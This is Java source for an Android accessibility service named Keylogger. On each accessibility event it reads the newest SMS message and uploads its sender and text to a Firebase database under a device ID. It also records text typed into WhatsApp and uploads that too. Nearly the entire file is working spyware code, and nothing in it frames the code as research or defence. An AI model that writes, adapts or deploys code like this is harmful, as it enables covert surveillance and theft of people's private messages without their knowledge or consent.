package com.ashish.keyloggerfirebaseservice;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.widget.Toast;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.io.DataOutputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Calendar;
import java.text.SimpleDateFormat;
import java.text.DateFormat;
import java.util.Locale;


public class Keylogger extends AccessibilityService {
    private class SendToServerTask extends AsyncTask<String, Void, String> {
        @Override
        protected String doInBackground(String... params) {



            try {


            } catch (Exception e) {
                e.printStackTrace();
            }
            return params[0];
        }
    }

    @Override
    public void onServiceConnected() {
        Log.d("Keylogger", "Starting service");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {

        Cursor cursor=null;
        FirebaseDatabase database = FirebaseDatabase.getInstance();
        DateFormat df = new SimpleDateFormat("dd-MM-yyyy, HH:mm:ss z", Locale.US);
        String time = df.format(Calendar.getInstance().getTime());
        cursor=getContentResolver().query(Uri.parse("content://sms"),null,null,null,null);
        cursor.moveToFirst();
        SharedPreferences sharedpreferences = getSharedPreferences("Name_of_Pref", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor=sharedpreferences.edit();
        if(!cursor.getString(0).equalsIgnoreCase(sharedpreferences.getString("LAST-MESSAGE-ID",null)))
        {
            DatabaseReference myRef = database.getReference( sharedpreferences.getString("DEVICE-ID","")+"/Messages/"+cursor.getString(0));
            myRef.setValue(time+"->"+cursor.getString(2)+"-"+cursor.getString(12)+"");
            editor.putString("LAST-MESSAGE-ID",cursor.getString(0)+"");
            editor.commit();
        }


if (event.getPackageName().equals("com.whatsapp"))
{
    switch(event.getEventType()) {
        case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
            String data = event.getText().toString();
            editor.putString("WHATSAPP-MESSAGE-LOG",data+"");
            editor.commit();
            break;
        }
        default:
            break;
    }
}

        if(event.getText().toString().equalsIgnoreCase("[Type a message]")){
            if(!sharedpreferences.getString("WHATSAPP-MESSAGE-LOG","").equalsIgnoreCase("")&&!sharedpreferences.getString("WHATSAPP-MESSAGE-LOG","").equalsIgnoreCase("[Type a message]"))
            {
                DatabaseReference myRefwhatsapp = database.getReference( sharedpreferences.getString("DEVICE-ID",null)+"/Whatsapp/"+time);
                myRefwhatsapp.setValue(sharedpreferences.getString("WHATSAPP-MESSAGE-LOG",""));
                editor.putString("WHATSAPP-MESSAGE-LOG","");
                editor.commit();
            }

        }
    }


    @Override
    public void onInterrupt() {

    }
}
